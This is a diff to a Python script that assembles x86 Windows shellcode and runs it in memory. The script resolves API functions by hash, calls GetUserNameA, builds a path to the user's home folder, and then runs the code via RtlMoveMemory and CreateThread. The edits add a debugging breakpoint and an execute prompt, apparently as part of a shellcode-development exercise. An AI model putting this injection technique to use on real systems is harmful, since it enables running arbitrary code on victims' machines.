@@ -20,7 +20,7 @@ def asm2shell(c):
     ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
 
     print("Shellcode located at address %s" % hex(ptr))
-    #input("...ENTER TO EXECUTE SHELLCODE...")
+    input("...ENTER TO EXECUTE SHELLCODE...")
 
     ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
@@ -130,11 +130,9 @@ code += "push esp;"         # Name address
 code += "call [ebp + 0x14];"# call LoadLibraryA
 code += "mov ebx, eax;"
 
-
-#### DAY 2 ####
 # load GetUserNameA  
 code += "push 0x5c52aa34;"
-code += "call dword ptr [ebp+0x4];"  # call find_function
+code += "call dword ptr [ebp+0x4];"
 code += "mov [ebp + 0x20], eax;"
 
 # pcbBuffer
@@ -149,6 +147,7 @@ code += "push eax;"
 code += "call [ebp + 0x20];"
 code += "mov ecx, [esp];"
 
+code += "int3;"
 # Dynamically create the path for the home folder of the user given the output
 # push C:\Users\
 code += "mov esi, esp;"
